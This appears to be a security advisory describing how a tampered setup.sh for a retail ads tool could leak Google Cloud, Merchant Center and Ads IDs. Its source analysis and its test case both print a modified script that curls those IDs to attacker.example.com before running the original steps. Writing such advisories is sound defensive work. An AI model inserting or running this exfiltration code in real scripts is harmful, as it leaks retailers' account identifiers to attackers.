### Vulnerability List

- Vulnerability Name: Data Exfiltration via Modified Setup Script
- Description:
    1. An attacker with malicious intent crafts a modified version of the `setup.sh` script.
    2. This modified script includes additional commands to exfiltrate sensitive information before executing the original script's logic.
    3. The attacker uses social engineering techniques to trick a retailer into downloading and executing this compromised `setup.sh` script instead of the legitimate one.
    4. When the retailer executes the modified script, it first runs the attacker's malicious commands.
    5. These malicious commands can capture the command-line arguments provided by the retailer, such as `project_id`, `merchant_id`, and `ads_customer_id`, which are essential for accessing their Google Merchant Center and Google Ads data.
    6. The captured sensitive information is then sent to an attacker-controlled external server via a network request (e.g., using `curl` or `wget`).
    7. After exfiltrating the data, the modified script proceeds to execute the original logic of the `setup.sh` script, potentially masking the compromise and allowing the data transfer setup to proceed as seemingly normal.
- Impact:
    - Exposure of sensitive Google Cloud Project ID, Google Merchant Center ID, and Google Ads Customer ID to the attacker.
    - This information allows the attacker to identify and target the retailer's specific Google accounts.
    - The attacker can use these IDs to attempt further attacks, such as trying to gain unauthorized access to the retailer's Google Merchant Center and Google Ads data, or impersonating the retailer.
    - While this vulnerability does not directly exfiltrate the Merchant Center or Ads data itself, it provides the attacker with the necessary identifiers to potentially conduct more sophisticated attacks aimed at data exfiltration or account compromise.
- Vulnerability Rank: Medium
- Currently Implemented Mitigations:
    - None. The provided project does not include any measures to prevent the execution of modified scripts or to verify the integrity of the `setup.sh` script.
- Missing Mitigations:
    - **Integrity Checks:** Implement integrity checks for the `setup.sh` script, such as using checksums or digital signatures, to ensure that users are running the genuine script and not a modified version.
    - **Secure Distribution:** Provide the `setup.sh` script through a secure and trusted channel, advising users to download it directly from the official repository and verify its source.
    - **User Warnings:** Include clear warnings in the documentation and on the download page about the risks of running scripts from untrusted sources and the importance of verifying the script's integrity.
    - **Input Validation (Limited Mitigation):** While not directly preventing this exfiltration vulnerability, robust input validation in the Python scripts called by `setup.sh` can mitigate some downstream risks if the attacker tries to inject malicious commands through parameters *after* gaining initial access via script modification.
- Preconditions:
    - The attacker must successfully employ social engineering to convince a retailer to download and execute a modified version of the `setup.sh` script.
    - The retailer must provide valid Google Cloud Project ID, Google Merchant Center ID, and Google Ads Customer ID as command-line arguments when running the modified `setup.sh` script.
- Source Code Analysis:
    1. **`setup.sh` script:** The `setup.sh` script is the entry point for the tool's installation. It directly executes `python cloud_env_setup.py "$@"`.
    ```bash
    #!/bin/bash
    # MarkUp setup script.

    set -e

    VIRTUALENV_PATH=$HOME/"markup-venv"

    # Create virtual environment with python3
    if [[ ! -d "${VIRTUALENV_PATH}" ]]; then
      virtualenv -p python3 "${VIRTUALENV_PATH}"
    fi


    # Activate virtual environment.
    source ~/markup-venv/bin/activate

    # Install dependencies.
    pip install -r requirements.txt

    # Setup cloud environment.
    PYTHONPATH=src/plugins:$PYTHONPATH
    export PYTHONPATH
    python cloud_env_setup.py "$@"
    ```
    2. **Vulnerability Point:** The vulnerability lies in the lack of integrity checks on the `setup.sh` script itself. An attacker can modify this script to insert malicious commands before the call to `python cloud_env_setup.py "$@"`.
    3. **Malicious Modification Example:** An attacker could modify `setup.sh` to include commands that exfiltrate the command-line arguments before the original script logic begins. For example, adding the following lines at the beginning of `setup.sh`:
    ```bash
    #!/bin/bash
    # Modified setup.sh by malicious actor

    # Exfiltration of command-line arguments
    PROJECT_ID=$(echo "$@" | awk -F'--project_id=' '{print $2}' | awk -F' ' '{print $1}')
    MERCHANT_ID=$(echo "$@" | awk -F'--merchant_id=' '{print $2}' | awk -F' ' '{print $1}')
    ADS_CUSTOMER_ID=$(echo "$@" | awk -F'--ads_customer_id=' '{print $2}' | awk -F' ' '{print $1}')

    curl "https://attacker.example.com/exfiltrate?project_id=$PROJECT_ID&merchant_id=$MERCHANT_ID&ads_customer_id=$ADS_CUSTOMER_ID"

    # Original setup.sh script content starts here
    set -e

    VIRTUALENV_PATH=$HOME/"markup-venv"
    # ... rest of the original setup.sh script ...
    ```
    4. **Execution Flow:** When the retailer runs the modified `setup.sh` with command-line arguments, the added malicious code will execute first. This code extracts `project_id`, `merchant_id`, and `ads_customer_id` from the command-line arguments and sends them to `attacker.example.com`. After the exfiltration, the script proceeds to execute the original virtual environment setup, dependency installation, and the call to `cloud_env_setup.py`. This makes the malicious activity less obvious to the victim.

- Security Test Case:
    1. **Setup Attacker Server:** Prepare a simple HTTP server (e.g., using `netcat` or Python's `http.server`) to listen for incoming requests from the modified `setup.sh` script. Let's say the attacker server is listening on `attacker.example.com` at port 80.
    2. **Modify `setup.sh`:**  Modify the original `setup.sh` script by adding the malicious code snippet from the Source Code Analysis step at the beginning of the file. Replace `attacker.example.com` with the actual address of your test server.
    ```bash
    #!/bin/bash
    # Modified setup.sh by malicious actor

    # Exfiltration of command-line arguments
    PROJECT_ID=$(echo "$@" | awk -F'--project_id=' '{print $2}' | awk -F' ' '{print $1}')
    MERCHANT_ID=$(echo "$@" | awk -F'--merchant_id=' '{print $2}' | awk -F' ' '{print $1}')
    ADS_CUSTOMER_ID=$(echo "$@" | awk -F'--ads_customer_id=' '{print $2}' | awk -F' ' '{print $1}')

    curl "http://attacker.example.com/exfiltrate?project_id=$PROJECT_ID&merchant_id=$MERCHANT_ID&ads_customer_id=$ADS_CUSTOMER_ID"

    # Original setup.sh script content starts here
    set -e

    VIRTUALENV_PATH=$HOME/"markup-venv"
    # ... rest of the original setup.sh script ...
    ```
    3. **Victim Execution:**  As a retailer (victim), execute the modified `setup.sh` script with valid parameters for your test Google Cloud project, Merchant Center, and Ads accounts:
    ```bash
    cd shopping-markup;
    sh setup.sh --project_id=your-gcp-project-id --merchant_id=your-merchant-id --ads_customer_id=your-ads-customer-id --market_insights=False
    ```
    4. **Verify Exfiltration:** Check the logs of your attacker server. You should see an HTTP GET request to `/exfiltrate` containing the `project_id`, `merchant_id`, and `ads_customer_id` as query parameters. This confirms that the sensitive information has been successfully exfiltrated to the attacker-controlled server before the original script logic was executed.
    5. **Observe Normal Execution (Optional):** The rest of the `setup.sh` script should continue to execute, setting up the virtual environment and calling the Python script. If no errors occur in the original script logic (which was not modified to break functionality), the retailer might not immediately suspect any malicious activity, as the setup process might appear to proceed normally after the initial data exfiltration.
